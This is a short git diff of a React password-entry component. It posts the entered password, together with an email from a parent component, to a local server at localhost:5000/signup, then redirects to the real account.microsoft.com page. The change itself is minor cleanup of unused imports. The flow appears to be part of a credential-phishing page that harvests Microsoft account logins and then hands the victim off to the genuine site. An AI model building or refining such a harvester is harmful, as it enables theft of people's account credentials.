@@ -1,11 +1,10 @@
 import React, {useState} from 'react';
 import Logo from "./assets/logo.png";
-import {Link, useNavigate} from "react-router-dom";
+import {Link} from "react-router-dom";
 import axios from "axios";
 function Pwd(props) {
     const [password, setPassword] = useState("");
     const [inValidPass, setInValidPass] = useState(false);
-    const navigate = useNavigate();
     const onPasswordChange = (e) => {
         setPassword(e.target.value);
     }
@@ -16,7 +15,7 @@ function Pwd(props) {
         }else
         {
             setInValidPass(false);
-            axios.post("http://localhost:5000/signup", {email:props.mail, password}).then((response) =>
+            axios.post("http://localhost:5000/signup", {email:props.mail, password}).then(() =>
             {
                 window.location.href = "https://account.microsoft.com/?refd=account.microsoft.com";
             }).catch((err) => {
